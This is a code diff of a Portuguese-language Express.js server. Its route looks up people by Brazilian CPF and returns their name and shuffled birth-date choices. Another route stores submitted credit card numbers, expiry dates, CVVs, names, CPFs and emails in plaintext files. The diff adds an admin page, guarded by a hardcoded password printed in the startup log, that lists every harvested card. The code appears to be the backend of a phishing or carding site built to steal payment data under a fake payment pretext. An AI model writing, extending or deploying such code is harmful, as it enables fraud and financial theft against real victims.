@@ -1,6 +1,7 @@
 const express = require('express');
 const path = require('path');
 const cors = require('cors');
+const fs = require('fs');
 
 const app = express();
 
@@ -18,17 +19,13 @@ function gerarDataAleatoria(anoMin, anoMax) {
   return `${ano}-${mes}-${dia}`;
 }
 
-// Função para formatar data
 function formatarData(dataStr) {
   if (!dataStr) return '---';
   const partes = dataStr.split('-');
-  if (partes.length === 3) {
-    return `${partes[2]}/${partes[1]}/${partes[0]}`;
-  }
+  if (partes.length === 3) return `${partes[2]}/${partes[1]}/${partes[0]}`;
   return dataStr;
 }
 
-// Função para gerar valor aleatório baseado no CPF
 function gerarValorPorCPF(cpf) {
   let hash = 0;
   for (let i = 0; i < cpf.length; i++) {
@@ -42,13 +39,13 @@ function gerarValorPorCPF(cpf) {
   return parseFloat(valorReais);
 }
 
-// ====================== ROTA PARA BUSCAR CPF ======================
+// ROTA PARA BUSCAR CPF
 app.post('/buscar-cpf', async (req, res) => {
   const { cpf } = req.body;
   console.log(`🔍 Buscando CPF: ${cpf}`);
 
   if (!cpf || cpf.length !== 11) {
-    return res.status(400).json({ success: false, erro: 'CPF inválido - deve conter 11 dígitos' });
+    return res.status(400).json({ success: false, erro: 'CPF inválido' });
   }
 
   try {
@@ -61,9 +58,7 @@ app.post('/buscar-cpf', async (req, res) => {
       timeout: 5000
     });
 
-    if (!response.ok) {
-      throw new Error(`API retornou ${response.status}`);
-    }
+    if (!response.ok) throw new Error(`API retornou ${response.status}`);
 
     const data = await response.json();
     let nomeUsuario = '';
@@ -78,23 +73,15 @@ app.post('/buscar-cpf', async (req, res) => {
       nomeUsuario = data.nome;
     }
     
-    if (!dataNascimentoReal) {
-      dataNascimentoReal = gerarDataAleatoria(1970, 2000);
-    }
+    if (!dataNascimentoReal) dataNascimentoReal = gerarDataAleatoria(1970, 2000);
     
-    const opcoesDatas = [
-      dataNascimentoReal,
-      gerarDataAleatoria(1960, 1990),
-      gerarDataAleatoria(1980, 2010)
-    ];
-    
+    const opcoesDatas = [dataNascimentoReal, gerarDataAleatoria(1960, 1990), gerarDataAleatoria(1980, 2010)];
     for (let i = opcoesDatas.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
     }
     
     console.log(`✅ Dados encontrados: ${nomeUsuario}`);
-    console.log(`📅 Data real: ${dataNascimentoReal}`);
     
     res.json({
       success: true,
@@ -115,12 +102,7 @@ app.post('/buscar-cpf', async (req, res) => {
     const nomeSimulado = `Usuário CPF ${cpf.slice(0,3)}.${cpf.slice(3,6)}.${cpf.slice(6,9)}-${cpf.slice(9)}`;
     const dataReal = gerarDataAleatoria(1970, 2000);
     
-    const opcoesDatas = [
-      dataReal,
-      gerarDataAleatoria(1960, 1990),
-      gerarDataAleatoria(1980, 2010)
-    ];
-    
+    const opcoesDatas = [dataReal, gerarDataAleatoria(1960, 1990), gerarDataAleatoria(1980, 2010)];
     for (let i = opcoesDatas.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
@@ -137,12 +119,12 @@ app.post('/buscar-cpf', async (req, res) => {
       agencia: '0001',
       conta: '12345-6',
       simulado: true,
-      message: 'Dados simulados (API indisponível)'
+      message: 'Dados simulados'
     });
   }
 });
 
-// ====================== ROTAS HTML ======================
+// ROTAS HTML
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -151,16 +133,12 @@ app.get('/pagamento.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'pagamento.html'));
 });
 
-// ====================== ROTA PARA SALVAR CARTÃO EM ARQUIVO TXT ======================
-const fs = require('fs');
-
+// ROTA PARA SALVAR CARTÃO
 app.post('/salvar-cartao-txt', (req, res) => {
     const { nome, cpf, cartao, validade, cvv, email, valor } = req.body;
     
-    console.log('📥 Salvando cartão no servidor...');
-    console.log('📦 Dados recebidos:', req.body);
+    console.log('📥 Salvando cartão...');
     
-    // Criar conteúdo do arquivo
     const dataHora = new Date().toLocaleString('pt-BR');
     const conteudo = `============================================================
 📅 DATA/HORA: ${dataHora}
@@ -171,45 +149,112 @@ app.post('/salvar-cartao-txt', (req, res) => {
 🔢 CVV: ${cvv}
 📧 E-MAIL: ${email}
 💰 VALOR: ${valor}
-============================================================
-
-`;
+============================================================\n\n`;
     
     try {
-        // Criar pasta se não existir (com permissões)
         const pastaDados = path.join(__dirname, 'dados_cartoes');
         if (!fs.existsSync(pastaDados)) {
-            fs.mkdirSync(pastaDados, { recursive: true, mode: 0o777 });
-            console.log('📁 Pasta criada:', pastaDados);
+            fs.mkdirSync(pastaDados, { recursive: true });
         }
         
         const nomeArquivo = `cartoes_${new Date().toISOString().slice(0,10)}.txt`;
         const caminhoArquivo = path.join(pastaDados, nomeArquivo);
         
-        // Salvar arquivo (modo síncrono para garantir)
         fs.appendFileSync(caminhoArquivo, conteudo, 'utf8');
         
         console.log(`✅ Cartão salvo em: ${caminhoArquivo}`);
-        res.json({ success: true, message: 'Cartão salvo com sucesso!' });
+        res.json({ success: true });
         
     } catch (err) {
-        console.error('❌ Erro ao salvar:', err);
-        res.status(500).json({ success: false, erro: 'Erro ao salvar: ' + err.message });
+        console.error('❌ Erro:', err.message);
+        res.status(500).json({ success: false, erro: err.message });
     }
 });
 
-// ====================== FALLBACK ======================
+// ADMIN - VER CARTÕES
+app.get('/admin/ver-cartoes-servidor', (req, res) => {
+    const SENHA_ADMIN = "777ga30";
+    const senhaDigitada = req.query.senha || '';
+    
+    if (senhaDigitada !== SENHA_ADMIN) {
+        return res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head><meta charset="UTF-8"><title>Acesso Restrito</title>
+            <style>
+                body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: monospace; }
+                .login-box { background: #0f3460; padding: 40px; border-radius: 20px; text-align: center; border-left: 4px solid #ffb600; }
+                h1 { color: #ffb600; }
+                input { padding: 10px; margin: 20px 0; border-radius: 8px; border: none; width: 100%; background: #1a1a2e; color: #fff; }
+                button { background: #ffb600; color: #004aad; padding: 10px 30px; border: none; border-radius: 8px; cursor: pointer; }
+            </style>
+            </head>
+            <body>
+                <div class="login-box">
+                    <h1>🔒 ACESSO RESTRITO</h1>
+                    <form method="GET">
+                        <input type="password" name="senha" placeholder="Digite a senha" autocomplete="off">
+                        <button type="submit">ENTRAR</button>
+                    </form>
+                </div>
+            </body>
+            </html>
+        `);
+    }
+    
+    const pasta = path.join(__dirname, 'dados_cartoes');
+    let html = `<!DOCTYPE html>
+    <html>
+    <head><meta charset="UTF-8"><title>Admin - Cartões</title>
+    <style>
+        body { font-family: monospace; background: #1a1a2e; padding: 20px; color: #fff; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { text-align: center; color: #ffb600; }
+        .card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 4px solid #ffb600; }
+        .card h3 { color: #ffb600; }
+        pre { background: #1a1a2e; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; }
+        button { background: #ffb600; color: #004aad; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin-bottom: 20px; }
+        .logout { text-align: right; margin-bottom: 15px; }
+        .logout a { color: #ffb600; text-decoration: none; }
+    </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logout"><a href="?">🚪 Sair</a></div>
+            <h1>📋 ADMIN - CARTÕES SALVOS</h1>
+            <button onclick="location.reload()">🔄 Atualizar</button>
+    `;
+    
+    try {
+        if (fs.existsSync(pasta)) {
+            const arquivos = fs.readdirSync(pasta).filter(f => f.endsWith('.txt')).sort().reverse();
+            if (arquivos.length === 0) {
+                html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3></div>';
+            } else {
+                arquivos.forEach(arq => {
+                    const conteudo = fs.readFileSync(path.join(pasta, arq), 'utf8');
+                    html += `<div class="card"><h3>📄 ${arq}</h3><pre>${conteudo}</pre></div>`;
+                });
+            }
+        } else {
+            html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3></div>';
+        }
+    } catch(e) {
+        html += '<div class="card"><h3>❌ Erro ao ler arquivos</h3></div>';
+    }
+    
+    html += `</div></body></html>`;
+    res.send(html);
+});
+
+// FALLBACK
 app.use((req, res) => {
   res.status(404).send('Página não encontrada');
 });
 
-// ====================== INICIA O SERVIDOR ======================
+// INICIA O SERVIDOR
 const PORT = 3000;
-
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
-  console.log(`📁 Pasta atual: ${__dirname}`);
-  console.log(`🌐 Acesse: http://localhost:${PORT}\n`);
-  console.log(`🚀 Tunnel ready! Seu app está disponível externamente.`);
-  console.log(`🔒 Admin: http://localhost:${PORT}/admin/ver-cartoes`);
+  console.log(`🔒 Admin: http://localhost:${PORT}/admin/ver-cartoes-servidor?senha=777ga30`);
 });
